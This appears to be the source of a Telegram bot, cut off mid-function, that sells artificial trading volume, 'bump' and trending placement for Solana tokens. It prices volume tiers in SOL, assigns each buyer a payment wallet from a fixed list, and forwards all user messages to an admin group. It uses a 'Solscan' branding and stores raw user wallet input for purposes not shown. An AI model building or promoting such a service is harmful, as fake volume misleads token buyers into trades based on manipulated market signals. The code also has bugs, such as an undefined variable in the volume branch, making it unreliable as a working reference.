from dotenv import load_dotenv
import os
from solders.pubkey import Pubkey  # type: ignore
import base58
import logging
from typing import Final
from telegram import Update 
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CallbackQueryHandler
import re
import sqlite3
import time  
from telegram.error import BadRequest
import asyncio
import random
from datetime import datetime
from keep_alive import keep_alive
import sys

# Configure logging for Render
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    stream=sys.stdout  # Important: logs to stdout for Render
)

# Track the most recent token entered by any user
recent_token = {
    'name': None,
    'symbol': None,
    'timestamp': None
}
load_dotenv()
TOKEN = os.getenv("TOKEN")

# === ADD THESE IMPORTS RIGHT HERE ===
import traceback
import sys
# === END OF ADDED IMPORTS ===

user_states = {}  # tracks what each user is expected to do
TOKEN_REGEX = re.compile(r"^[A-Za-z0-9]{32,44}$")
URL_REGEX = re.compile(r'^https?://\S+$')
OWNER_ID = [7035997375, 7109310416, 1412673345]
ADMIN_GROUP_ID = -1003549750823  # Your actual group ID

# Add this with your other configuration variables
# Coupon codes with percentage discounts (30%, 50%, 90%)
VALID_COUPONS = {
    # 30% discount coupons
    "TX4FJ30": 30,
    "HASHS30": 30,
    "SOLSCAN30": 30,
    "WALLET30": 30,
    "ADDR730": 30,
    "SOL9X30": 30,
    
    # 50% discount coupons
    "SCAN450": 50,
    "SOLTX750": 50,
    "SCANSOL50": 50,
    "SCANHASH50": 50,
    
    # 90% discount coupons
    "SLOT890": 90,
    "SOL2490": 90,
    "BLOCK90": 90,
    "OISCANSOL90": 90,
    "D27DONA90": 90,
}

sol_price_cache = {
    'price': 0,
    'timestamp': 0
}
CACHE_DURATION = 60  # Cache price for 60 seconds

# Price threshold tracking for $50 increments
last_used_sol_price = {
    'price': 0,
    'threshold': 0
}
THRESHOLD_STEP = 50  # $50 threshold

# Fixed USD prices for services
SLOW_BUMP_PRICES = {
    '1hr': 40,    # $40 for 1 hour slow bump
    '6hr': 240,   # $240 for 6 hours
    '12hr': 400,  # $400 for 12 hours
    '24hr': 800   # $800 for 24 hours
}

MEDIUM_BUMP_PRICES = {
    '1hr': 80,    # $80 for 1 hour medium bump
    '6hr': 480,   # $480 for 6 hours
    '12hr': 800,  # $800 for 12 hours
    '24hr': 1360  # $1360 for 24 hours
}

FAST_BUMP_PRICES = {
    '1hr': 120,   # $120 for 1 hour fast bump
    '6hr': 560,   # $560 for 6 hours
    '12hr': 1040, # $1040 for 12 hours
    '24hr': 1600  # $1600 for 24 hours
}

async def get_sol_price_cached():
    """Fetch SOL price safely from CoinGecko with caching"""
    current_time = time.time()

    if current_time - sol_price_cache['timestamp'] < CACHE_DURATION:
        return sol_price_cache['price']

    url = "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd"

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    data = await response.json()
                    price = data.get("solana", {}).get("usd", 0)

                    if price > 0:
                        sol_price_cache['price'] = price
                        sol_price_cache['timestamp'] = current_time
                        return price
    except Exception as e:
        print(f"Error fetching SOL price: {e}")

    return sol_price_cache['price']

async def get_sol_price_with_change():
    """Fetch SOL price and 24h change from CoinGecko"""
    current_time = time.time()

    if current_time - sol_price_cache['timestamp'] < CACHE_DURATION:
        return sol_price_cache['price'], sol_price_cache.get('change', 0)

    url = "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd&include_24hr_change=true"

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    data = await response.json()
                    price = data.get("solana", {}).get("usd", 0)
                    change = data.get("solana", {}).get("usd_24h_change", 0)

                    if price > 0:
                        sol_price_cache['price'] = price
                        sol_price_cache['change'] = change
                        sol_price_cache['timestamp'] = current_time
                        return price, change
    except Exception as e:
        print(f"Error fetching SOL price: {e}")

    return sol_price_cache['price'], sol_price_cache.get('change', 0)

async def get_sol_price_with_threshold():
    """Get the actual SOL price without rounding"""
    return await get_sol_price_cached()

# Token cache for DexScreener data
token_cache = {
    'message': '⏳ Loading token data...',
    'last_update': None,
    'last_fetch_time': 0
}
CACHE_DURATION_HOURS = 1  # Update every hour

async def get_tokens_by_market_cap(min_mc=0, max_mc=float('inf'), chain='solana', limit=4):
    """
    Fetch tokens from DexScreener with better error handling and timeouts
    Filters out blockchain names and finds real tokens
    """
    try:
        # Use multiple queries to get more variety
        search_queries = [
            f"https://api.dexscreener.com/latest/dex/search?q={chain}",
            "https://api.dexscreener.com/latest/dex/search?q=trending",
            "https://api.dexscreener.com/latest/dex/search?q=new",
        ]
        
        all_pairs = []
        blockchain_names = ['solana', 'wrapped sol', 'sol', 'wsol']  # Names to filter out
        
        async with aiohttp.ClientSession() as session:
            for query_url in search_queries:
                try:
                    print(f"🔍 Fetching from: {query_url}")
                    async with session.get(query_url, timeout=10) as response:
                        if response.status == 200:
                            data = await response.json()
                            pairs = data.get('pairs', [])
                            print(f"📊 Found {len(pairs)} pairs from this query")
                            all_pairs.extend(pairs)
                        else:
                            print(f"⚠️ Received status {response.status} from DexScreener")
                except asyncio.TimeoutError:
                    print(f"⏰ Timeout connecting to DexScreener")
                    continue
                except Exception as e:
                    print(f"Error with query {query_url}: {e}")
                    continue
            
            if not all_pairs:
                print("❌ No pairs found")
                return "No token data available at this time."
            
            print(f"\n📊 Total pairs collected: {len(all_pairs)}")
            
            # Process all pairs
            token_map = {}  # address -> {pair, mc, name, symbol}
            
            for pair in all_pairs:
                # Check if it's on Solana
                if pair.get('chainId', '').lower() != chain.lower():
                    continue
                
                # Get market cap
                mc = pair.get('marketCap', 0)
                if isinstance(mc, str):
                    mc = float(mc) if mc else 0
                
                # Skip if no market cap data or market cap too low
                if mc < 10000:  # Skip tokens with very low market cap
                    continue
                
                # Get base token info
                base_token = pair.get('baseToken', {})
                token_name = base_token.get('name', '').lower()
                token_symbol = base_token.get('symbol', '').lower()
                
                # Skip if it's a blockchain name or common filler
                if any(name in token_name for name in blockchain_names) or \
                   any(name in token_symbol for name in blockchain_names):
                    continue
                
                token_address = base_token.get('address', '')
                
                # Keep the highest market cap version of each token
                if token_address not in token_map or mc > token_map[token_address]['mc']:
                    token_map[token_address] = {
                        'pair': pair,
                        'mc': mc,
                        'name': base_token.get('name', 'Unknown'),
                        'symbol': base_token.get('symbol', 'Unknown'),
                        'address': token_address
                    }
            
            # Convert to list and sort by market cap (highest first)
            unique_tokens = list(token_map.values())
            unique_tokens.sort(key=lambda x: x['mc'], reverse=True)
            
            # If we don't have enough real tokens, use fallback
            if len(unique_tokens) < limit:
                print(f"⚠️ Only found {len(unique_tokens)} real tokens, using fallback")
                return None  # This will trigger fallback
            
            # Take top 'limit'
            top_tokens = unique_tokens[:limit]
            
            print(f"\n✨ Found {len(unique_tokens)} unique tokens with market cap data")
            print(f"✨ Top {len(top_tokens)} tokens:")
            for token in top_tokens:
                print(f"   • {token['name']} ({token['symbol']}) - ${token['mc']:,.0f}")
            
            # Format and return
            return format_token_message([t['pair'] for t in top_tokens])
                
    except Exception as e:
        print(f"❌ Error fetching tokens: {e}")
        return None  # Return None to trigger fallback
    
def format_token_message(pairs):
    """Format the pairs into the desired format with 💊 emoji"""
    if not pairs:
        return "No token data available at this time."
    
    message = ""
    
    for pair in pairs[:4]:  # Show top 4
        base_token = pair.get('baseToken', {})
        name = base_token.get('name', 'Unknown')
        symbol = base_token.get('symbol', 'Unknown')
        
        # Add $ to symbol if not already there
        if not symbol.startswith('$'):
            symbol = f'${symbol}'
        
        # Format as: 💊 Name • $SYMBOL
        message += f"💊 {name} • {symbol}\n"
    
    return message

async def update_token_cache():
    """Update the cached token message every hour"""
    first_run = True
    while True:
        try:
            if not first_run:
                # Wait for 1 hour (3600 seconds)
                await asyncio.sleep(3600)
            first_run = False
            
            # Fetch new tokens with timeout
            try:
                message = await asyncio.wait_for(
                    get_tokens_by_market_cap(),
                    timeout=30  # 30 second timeout
                )
                
                # If message is None (no real tokens found), use fallback but keep trying
                if message is None:
                    print("⚠️ No real tokens found, keeping previous cache")
                    # Keep existing cache
                else:
                    token_cache['message'] = message
                    token_cache['last_update'] = datetime.now()
                    token_cache['last_fetch_time'] = time.time()
                    print(f"✅ Token cache updated at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                    
            except asyncio.TimeoutError:
                print("⏰ Token fetch timed out, using cached/fallback data")
            except Exception as e:
                print(f"❌ Error fetching tokens: {e}")
                # Keep using existing cached data
                
        except Exception as e:
            print(f"❌ Error in token cache loop: {e}")
            # Wait a bit before retrying on error
            await asyncio.sleep(60)

# Add a fallback message in case API is down
FALLBACK_TOKENS = """Recent Token From Solscan Vol Bot
💊 Solana • $SOL
💊 Raydium • $RAY
💊 Jupiter • $JUP
💊 Bonk • $BONK
Updated: cache unavailable"""

def get_cached_tokens():
    """Get the cached token message with timestamp in the format you want"""
    if token_cache['last_update']:
        time_since = datetime.now() - token_cache['last_update']
        hours = int(time_since.total_seconds() / 3600)
        minutes = int((time_since.total_seconds() % 3600) / 60)
        
        # Get the base message without timestamp
        base_message = token_cache['message']
        
        # If message is an error message, use fallback
        if "Unable to fetch" in base_message or "Error" in base_message:
            return FALLBACK_TOKENS
        
        # Add the "Recent Token From Solscan Vol Bot" header and timestamp
        return f"Recent Token From Solscan Vol Bot\n{base_message}Updated: {hours}h {minutes}m ago"
    
    # If no update yet, return fallback
    return FALLBACK_TOKENS


#database
def init_db():
    conn = sqlite3.connect("wallets.db")
    cursor = conn.cursor()

    # First table: stores user-entered wallet input
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS wallets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            first_name TEXT,
            wallet_input TEXT
        )
    """)

    # Second table: stores assigned wallet addresses
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS user_wallets (
            user_id INTEGER PRIMARY KEY,
            wallet_address TEXT
        )
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)

    conn.commit()
    conn.close()



init_db()

WALLET_ADDRESSES = [
    "3UrQziUTpj5YtUAqncDqwJ44nFSB6pmHshkof3FdFqg3",
    "HCj958Pw1AsoGMbMirJ4gWqvcaHLdReYeTuSAjTDCzmj",
    "GYyFUyBg6ydMn7PGJVN9Lb2VTP2ECvm7BsnGnygsB44T",
    "BLFE2t58AJoy2FbiSs6Mvy1YMy3Sya41KgCU3JDwXLAS",
    "7StcZj7dFPJbnwvdTTi28XVMbvxFMXi7dxpu9pvTyfjt",
    "CpXeCiYB3y1UMejPQuo5w3VJYFRoSfMW8db3DnJt8qq7",
    "FaFBzPK7T7MLMYqps1eHmNTNfkXZ1kbJSB9STw9h2qwm"
]


def get_user_wallet(user_id):
    conn = sqlite3.connect("wallets.db")
    cursor = conn.cursor()

    # Check if user already has a wallet
    cursor.execute("SELECT wallet_address FROM user_wallets WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()

    if row:
        wallet = row[0]
    else:
        # Get used addresses
        cursor.execute("SELECT wallet_address FROM user_wallets")
        used_wallets = [row[0] for row in cursor.fetchall()]

        # Find an unused one
        wallet = None
        for w in WALLET_ADDRESSES:
            if w not in used_wallets:
                wallet = w
                break

        # If all are used, you can either:
        # 1. Reuse from the start, or
        # 2. Return an error / notify
        if wallet:
            cursor.execute("INSERT INTO user_wallets (user_id, wallet_address) VALUES (?, ?)", (user_id, wallet))
            conn.commit()
        else:
            wallet = "NO_AVAILABLE_WALLET"

    conn.close()
    return wallet



# This part is for setting up logging module, so you will know when (and why) things don't work as expected:
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s -%(message)s',
    level=logging.INFO
)

import aiohttp
import base64
import requests

def get_metadata_from_dexscreener(token_address):
    url = f"https://api.dexscreener.com/latest/dex/search?q={token_address}"
    try:
        response = requests.get(url)
        response.raise_for_status()
        data = response.json()
        if 'pairs' not in data or not data['pairs']:
            return None
        pair = data['pairs'][0]
        return {
            "name": pair.get("baseToken", {}).get("name", "N/A"),
            "symbol": pair.get("baseToken", {}).get("symbol", "N/A"),
            "icon": None,
            "priceUsd": pair.get("priceUsd"),
            "dex": pair.get("dexId"),
            "pairAddress": pair.get("pairAddress"),
            "url": pair.get("url")
        }
    except Exception:
        return None

async def get_solana_token_details(token_address):
    async def fetch_account_info(address):
        url = "https://api.mainnet-beta.solana.com"
        headers = {"Content-Type": "application/json"}
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "getAccountInfo",
            "params": [address, {"encoding": "base64"}]
        }
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload, headers=headers) as response:
                if response.status != 200:
                    return None
                return await response.json()

    async def fetch_metadata(mint_address):
        url = f"https://public-api.solscan.io/token/meta?tokenAddress={mint_address}"
        headers = {"accept": "application/json"}
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers) as response:
                if response.status == 200:
                    return await response.json()
                else:
                    return None

    try:
        data = await fetch_account_info(token_address)
        result = data.get("result", {}).get("value", {})

        if not result or result.get("owner") != "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA":
            raise Exception("Not a valid mint account")

        raw_data = result["data"][0]
        decoded = base64.b64decode(raw_data)

        if len(decoded) >= 82:
            supply = int.from_bytes(decoded[36:44], 'little') / (10 ** decoded[44])
            decimals = decoded[44]
            mint_address = token_address

        elif len(decoded) >= 165:
            mint_bytes = decoded[0:32]
            mint_address = base58.b58encode(mint_bytes).decode()
            return await get_solana_token_details(mint_address)

        else:
            raise Exception("Unrecognized layout")

        metadata = await fetch_metadata(mint_address)
        if metadata:
            return {
                "mint": mint_address,
                "supply": supply,
                "decimals": decimals,
                "name": metadata.get("name", "N/A"),
                "symbol": metadata.get("symbol", "N/A"),
                "icon": metadata.get("icon"),
                "url": None
            }
        else:
            fallback = get_metadata_from_dexscreener(mint_address)
            if fallback:
                return {
                    "mint": mint_address,
                    "supply": supply,
                    "decimals": decimals,
                    "name": fallback.get("name", "N/A"),
                    "symbol": fallback.get("symbol", "N/A"),
                    "icon": fallback.get("icon"),
                    "url": fallback.get("url")
                }

    except Exception:
        pass

    fallback = get_metadata_from_dexscreener(token_address)
    if fallback:
        return {
            "mint": token_address,
            "supply": 0,
            "decimals": 0,
            "name": fallback.get("name", "N/A"),
            "symbol": fallback.get("symbol", "N/A"),
            "icon": fallback.get("icon"),
            "url": fallback.get("url")
        }

    return {
        "mint": token_address,
        "supply": 0,
        "decimals": 0,
        "name": "N/A",
        "symbol": "N/A",
        "icon": None,
        "url": None
    }

def log_user(user):
        conn = sqlite3.connect("wallets.db")
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO users (user_id, username, first_name, last_active)
            VALUES (?, ?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT(user_id) DO UPDATE SET
                username=excluded.username,
                first_name=excluded.first_name,
                last_active=CURRENT_TIMESTAMP
        """, (user.id, user.username or "", user.first_name or ""))
        conn.commit()
        conn.close()

async def forward_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Forward user messages to admin group"""
    user = update.effective_user
    message = update.message
    
    # Get current time
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Determine message type
    if message.text:
        msg_type = "Message"
        content = message.text
    elif message.photo:
        msg_type = "Photo"
        content = "📷 [Photo]"
    elif message.video:
        msg_type = "Video"
        content = "🎥 [Video]"
    elif message.document:
        msg_type = "Document"
        content = f"📎 {message.document.file_name}"
    elif message.sticker:
        msg_type = "Sticker"
        content = "🎭 [Sticker]"
    elif message.voice:
        msg_type = "Voice"
        content = "🎤 [Voice Message]"
    elif message.animation:
        msg_type = "Animation"
        content = "🖼️ [GIF]"
    else:
        msg_type = "Unknown"
        content = "❓ [Unsupported message type]"
    
    # Create alert message
    alert_text = f"""
🔔 <b>User Activity Alert</b>

👤 <b>User:</b> {user.first_name} (@{user.username if user.username else 'No username'})
🆔 <b>ID:</b> <code>{user.id}</code>

📝 <b>Type:</b> {msg_type}
💬 <b>Content:</b> {content}

⏰ <b>Time:</b> {current_time}
    """
    
    # Create reply button for quick response
    keyboard = [
        [InlineKeyboardButton("📝 Reply to User", callback_data=f"reply_{user.id}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        # Forward to admin group
        await context.bot.send_message(
            chat_id=ADMIN_GROUP_ID,
            text=alert_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        
        # Also forward media if present
        if message.photo:
            await context.bot.send_photo(
                chat_id=ADMIN_GROUP_ID,
                photo=message.photo[-1].file_id,
                caption=f"📷 Photo from {user.first_name} (@{user.username})"
            )
        elif message.video:
            await context.bot.send_video(
                chat_id=ADMIN_GROUP_ID,
                video=message.video.file_id,
                caption=f"🎥 Video from {user.first_name} (@{user.username})"
            )
        elif message.document:
            await context.bot.send_document(
                chat_id=ADMIN_GROUP_ID,
                document=message.document.file_id,
                caption=f"📎 Document from {user.first_name} (@{user.username})"
            )
            
    except Exception as e:
        print(f"Error forwarding to admin: {e}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    log_user(user)
    text = update.message.text.strip()
    
    # === STEP 3: Delete user's message for clean chat ===
    try:
        await update.message.delete()
    except:
        pass  # Ignore if can't delete
    
    # === STEP 4: Delete previous bot message if exists ===
    if 'last_bot_message_id' in context.user_data:
        try:
            await context.bot.delete_message(
                chat_id=update.effective_chat.id,
                message_id=context.user_data['last_bot_message_id']
            )
        except:
            pass

    if context.user_data.get('awaiting_token'):
        context.user_data['awaiting_token'] = False

        if TOKEN_REGEX.fullmatch(text):
            # CLEAR ANY OLD BUMP AMOUNTS FIRST
            context.user_data.pop('bump_1hr_amount', None)
            context.user_data.pop('bump_3hr_amount', None)
            context.user_data.pop('bump_6hr_amount', None)
            context.user_data.pop('bump_12hr_amount', None)
            context.user_data.pop('bump_24hr_amount', None)
            
            token_data = await get_solana_token_details(text)
            context.user_data['token_address'] = text
            context.user_data['token_data'] = token_data  
            
            # === ADD THIS CODE ===
            # Update the recent token globally
            global recent_token
            recent_token['name'] = token_data['name']
            recent_token['symbol'] = token_data['symbol']
            recent_token['timestamp'] = datetime.now()
            # === END OF ADDED CODE ===

            # Get current SOL price with threshold for dynamic SOL calculation
            sol_price = await get_sol_price_with_threshold()
            
            # Fixed USD values for each option
            FIXED_USD = {
                '1hr': 70.0,    # $70 for 1 hour
                '3hr': 200.0,   # $200 for 3 hours
                '6hr': 400.0,   # $400 for 6 hours
                '12hr': 720.0,  # $720 for 12 hours
                '24hr': 1200.0  # $1200 for 24 hours
            }
            
            # Calculate SOL amounts based on current SOL price
            if sol_price > 0:
                sol_1hr = FIXED_USD['1hr'] / sol_price
                sol_3hr = FIXED_USD['3hr'] / sol_price
                sol_6hr = FIXED_USD['6hr'] / sol_price
                sol_12hr = FIXED_USD['12hr'] / sol_price
                sol_24hr = FIXED_USD['24hr'] / sol_price
                
                # STORE the calculated amounts for later use
                context.user_data['bump_1hr_amount'] = sol_1hr
                context.user_data['bump_3hr_amount'] = sol_3hr
                context.user_data['bump_6hr_amount'] = sol_6hr
                context.user_data['bump_12hr_amount'] = sol_12hr
                context.user_data['bump_24hr_amount'] = sol_24hr
                
                # Format buttons with dynamic SOL amounts (rounded to 3 decimal places)
                bump_keyboard = [
                    [InlineKeyboardButton(f'1Hour / {sol_1hr:.3f} SOL', callback_data='bump_1hr')],
                    [InlineKeyboardButton(f'3Hour / {sol_3hr:.3f} SOL', callback_data='bump_3hr')],
                    [InlineKeyboardButton(f'6Hour / {sol_6hr:.3f} SOL', callback_data='bump_6hr')],
                    [InlineKeyboardButton(f'12Hour / {sol_12hr:.3f} SOL', callback_data='bump_12hr')],
                    [InlineKeyboardButton(f'24Hour / {sol_24hr:.3f} SOL', callback_data='bump_24hr')],
                    [InlineKeyboardButton('🎲 Random', callback_data='bump_random')],
                ]
            else:
                # Fallback if price not available
                bump_keyboard = [
                    [InlineKeyboardButton('1Hour / 0.9 SOL', callback_data='bump_1hr')],
                    [InlineKeyboardButton('3Hour / 2.6 SOL', callback_data='bump_3hr')],
                    [InlineKeyboardButton('6Hour / 5.0 SOL', callback_data='bump_6hr')],
                    [InlineKeyboardButton('12Hour / 9.0 SOL', callback_data='bump_12hr')],
                    [InlineKeyboardButton('24Hour / 15.0 SOL', callback_data='bump_24hr')],
                    [InlineKeyboardButton('🎲 Random', callback_data='bump_random')],
                ]
            reply_markup = InlineKeyboardMarkup(bump_keyboard)
            # Delete previous bot message before sending new one
            if 'last_bot_message_id' in context.user_data:
                try:
                    await context.bot.delete_message(
                        chat_id=update.effective_chat.id,
                        message_id=context.user_data['last_bot_message_id']
                    )
                except:
                    pass

            sent_message = await update.message.reply_text(
                f'''

            <b>Name :</b> {token_data['name']}
            <b>Ticker :</b> {token_data['symbol']}
            <b>DEX :</b> {token_data.get('dex', 'Raydium')}
            <b>Chain :</b> Solana
            <b>Chart :</b> <a href="{token_data.get('url', '#')}">Open chart</a>

            <b>CA :</b>
            <code>{text}</code>

            <b>Select Spot</b>
            ''',
                parse_mode="HTML", 
                reply_markup=reply_markup
            )
            context.user_data['last_bot_message_id'] = sent_message.message_id
            
        else:
            await update.message.reply_text("❌ Invalid token format.")

    

    
    elif context.user_data.get('awaiting_volumn_token'):
        context.user_data['awaiting_volumn_token'] = False
        if TOKEN_REGEX.fullmatch(text):
            token_data = await get_solana_token_details(text)
            context.user_data['volumn_token'] = text
            context.user_data['token_data'] = token_data  # Store token data
            volumn_keyboard = [
                [InlineKeyboardButton('$50k = 3 SOL', callback_data='3sol'),
                 InlineKeyboardButton('$100k = 5 SOL', callback_data='5sol')],
                [InlineKeyboardButton('$250k = 13 SOL', callback_data='13sol'),
                 InlineKeyboardButton('$500k = 25 SOL', callback_data='25sol')],
                [InlineKeyboardButton('$1M = 45 SOL', callback_data='45sol'),
                 InlineKeyboardButton('$5M = 210 SOL', callback_data='210sol')],
                [InlineKeyboardButton('🔙 Back', callback_data='volume'),
                 InlineKeyboardButton('❌ Close', callback_data='main')]
            ]
            reply_markup = InlineKeyboardMarkup(volumn_keyboard)
            await update.message.reply_text(
                f'''

<b>Name :</b> {token_data['name']}
<b>Ticker :</b> {token_data['symbol']}
<b>DEX :</b> {token_data.get('dex', 'Raydium')}
<b>Chain :</b> Solana
<b>Chart :</b> <a href="{token_data.get('url', '#')}">Open chart</a>

<b>CA :</b>
<code>{text}</code>

<b>Select Spot</b>
''',
                parse_mode="HTML", reply_markup=reply_markup
            )
            context.user_data['last_bot_message_id'] = sent_message.message_id

        else:
            await update.message.reply_text("❌ Invalid token address.")
        return


    # Handle wallet input
    elif context.user_data.get('awaiting_wallet'):
        context.user_data['awaiting_wallet'] = False
        await handle_wallet_input(update, context)
        return

    # Handle trending token input
    # Handle trending token input
    elif context.user_data.get('awaiting_trending_token'):
        
        context.user_data['awaiting_trending_token'] = False

        if TOKEN_REGEX.fullmatch(text):
            token_data = await get_solana_token_details(text)
            context.user_data['trending_token'] = text
            context.user_data['token_data'] = token_data  # Store token data
            context.user_data['awaiting_trending_link'] = True
            
            # Create keyboard with Skip button
            keyboard = [
                [InlineKeyboardButton('⏭️ Skip', callback_data='skip_trending_link')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            sent_message = await update.message.reply_text(f'''

            <b>Name :</b> {token_data['name']}
            <b>Ticker :</b> {token_data['symbol']}
            <b>DEX :</b> {token_data.get('dex', 'Raydium')}
            <b>Chain :</b> Solana
            <b>Chart :</b> <a href="{token_data.get('url', '#')}">Open chart</a>

            <b>CA :</b>
            <code>{text}</code>

            Send me group link or Portal
            ''', parse_mode='HTML', reply_markup=reply_markup)
            context.user_data['last_bot_message_id'] = sent_message.message_id
            context.user_data['last_bot_message_id'] = sent_message.message_id

        else:
            await update.message.reply_text("❌ Invalid token address. Please try again.")
        return

    elif context.user_data.get('awaiting_coupon'):
        # Process coupon code
        coupon_code = text.strip().upper()
        
        # Check if this is a bump coupon (has usd_amount stored)
        usd_amount = context.user_data.get('coupon_usd_amount')
        service = context.user_data.get('coupon_service')
        
        # Get current SOL price
        sol_price = await get_sol_price_cached()
        
        if usd_amount and service and service.startswith('bump_'):
            # This is a bump service - calculate SOL from USD
            try:
                usd_float = float(usd_amount)
                if sol_price > 0:
                    amount = str(usd_float / sol_price)
                else:
                    # Fallback if SOL price not available
                    amount = str(usd_float / 200)  # Default $200 SOL price
            except:
                amount = context.user_data.get('coupon_payment_amount', '0')
        else:
            # Regular volume/tracking coupon
            amount = context.user_data.get('coupon_payment_amount')
        
        # Debug print
        print(f"DEBUG - User {update.effective_user.id} entered coupon: {coupon_code}")
        print(f"DEBUG - Retrieved amount: '{amount}'")
        print(f"DEBUG - USD amount: '{usd_amount}'")
        print(f"DEBUG - Service: '{service}'")
        print(f"DEBUG - SOL Price: {sol_price}")
        
        # If amount is None or empty, handle error
        if not amount:
            await update.message.reply_text("❌ Please select a package first.")
            context.user_data['awaiting_coupon'] = False
            return
            
        # Ensure amount is a string that can be converted to float
        try:
            amount_float = float(amount)
        except ValueError:
            await update.message.reply_text("❌ Invalid amount. Please try again.")
            context.user_data['awaiting_coupon'] = False
            return
        
        # Initialize coupon status if not exists
        if 'coupon_status' not in context.bot_data:
            context.bot_data['coupon_status'] = {}
        
        # Check if coupon exists
        if coupon_code not in VALID_COUPONS:
            # Invalid coupon
            keyboard = [
                [InlineKeyboardButton('❌ Cancel', callback_data='launch_token')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            sent_message = await update.message.reply_text(
                f'''
            ❌ <b>Invalid Coupon Code</b>

            The code <code>{coupon_code}</code> is not valid.
            ''',
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            context.user_data['last_bot_message_id'] = sent_message.message_id
            return
        
        # Check if coupon is active
        coupon_status = context.bot_data['coupon_status'].get(coupon_code, 'active')
        if coupon_status != 'active':
            keyboard = [
                [InlineKeyboardButton('❌ Cancel', callback_data='launch_token')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            sent_message = await update.message.reply_text(
                f'''
            ❌ <b>Coupon Expired/Inactive</b>

            The code <code>{coupon_code}</code> is currently inactive.
            Please try another coupon or contact support.
            ''',
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            context.user_data['last_bot_message_id'] = sent_message.message_id
            return
        
        # Valid and active coupon
        discount = VALID_COUPONS[coupon_code]
        context.user_data['awaiting_coupon'] = False
        
        # Calculate the discounted amount
        amount_float = float(amount)
        discount_amount = amount_float * (discount / 100)
        final_amount = amount_float - discount_amount
        
        # Send alert to admin group with coupon details
        user = update.effective_user
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        service_info = f" ({service})" if service else ""
        usd_info = f" (${usd_amount})" if usd_amount else ""
        
        coupon_alert = f"""
🎫 <b>Coupon Payment Details Received</b>

👤 <b>User:</b> {user.first_name} (@{user.username if user.username else 'No username'})
🆔 <b>ID:</b> <code>{user.id}</code>
💰 <b>Amount:</b> {amount} SOL{usd_info}
🎟️ <b>Coupon:</b> <code>{coupon_code}</code>
💵 <b>Discount:</b> {discount}% off
✅ <b>Status:</b> Valid Coupon
📋 <b>Service:</b> {service_info}

⏰ <b>Time:</b> {current_time}
        """
        
        keyboard = [
            [InlineKeyboardButton("📝 Reply to User", callback_data=f"reply_{user.id}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_GROUP_ID,
                text=coupon_alert,
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        except Exception as e:
            print(f"Error forwarding coupon details: {e}")
        
        # Get user's wallet address
        user_id = update.effective_user.id
        wallet_address = get_user_wallet(user_id)
        
        # Create service description for the message
        if service and service.startswith('bump_'):
            duration_map = {
                'bump_1hr': '1 Hour',
                'bump_3hr': '3 Hours',
                'bump_6hr': '6 Hours',
                'bump_12hr': '12 Hours',
                'bump_24hr': '24 Hours'
            }
            service_display = duration_map.get(service, service)
            service_text = f"<b>Service:</b> {service_display} Bump\n"
            original_text = f"<b>Original USD Value:</b> ${usd_amount}\n<b>SOL Amount:</b> {amount} SOL\n"
        else:
            service_text = ""
            original_text = f"<b>Original Amount:</b> {amount} SOL\n"
        
        # Create success message with wallet address and Confirm Payment button
        keyboard = [
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='confirm_payment_coupon')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        sent_message = await update.message.reply_text(
            f'''
        ✅ <b>Coupon Applied Successfully!</b>

        ━━━━━━━━━━━━━━━━━━━━━
        {service_text}{original_text}<b>Coupon Code:</b> <code>{coupon_code}</code>
        <b>Discount:</b> {discount}% ({discount_amount:.3f} SOL)
        <b>Final Amount:</b> {final_amount:.3f} SOL
        ━━━━━━━━━━━━━━━━━━━━━

        <b>Send {final_amount:.3f} SOL to:</b>
        <code>{wallet_address}</code>

        <i>After sending, click Confirm Payment below to verify</i>
        ''',
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        context.user_data['last_bot_message_id'] = sent_message.message_id
        
        # Clear the stored data
        context.user_data.pop('coupon_usd_amount', None)
        context.user_data.pop('coupon_service', None)


    # Handle trending group link input
    elif context.user_data.get('awaiting_trending_link'):
        context.user_data['awaiting_trending_link'] = False

        if URL_REGEX.fullmatch(text):
            context.user_data['trending_link'] = text
            token = context.user_data.get('trending_token', '')
            token_data = context.user_data.get('token_data', {'name': 'Unknown', 'symbol': 'Unknown'})
            
